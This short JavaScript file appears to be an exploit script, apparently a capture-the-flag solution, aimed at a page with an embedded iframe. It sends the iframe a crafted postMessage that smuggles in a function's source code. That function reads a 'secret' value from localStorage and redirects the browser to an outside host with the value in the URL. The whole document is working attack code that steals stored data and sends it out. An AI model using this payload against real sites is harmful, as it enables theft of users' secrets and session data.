const worker = document.getElementById('worker').contentWindow;

async function sleep(ms) {
  return new Promise((res) => setTimeout(() => res(), ms));
}

function exploit() {
  const t = localStorage.getItem('secret');
  location.href = "https://stc.drstra.in/?secret=" + t;
}

async function main() {
  await sleep(1000); // for iframe to load
  worker.postMessage(`{"1":${exploit.toString()}()});//`, '*');
}

main();
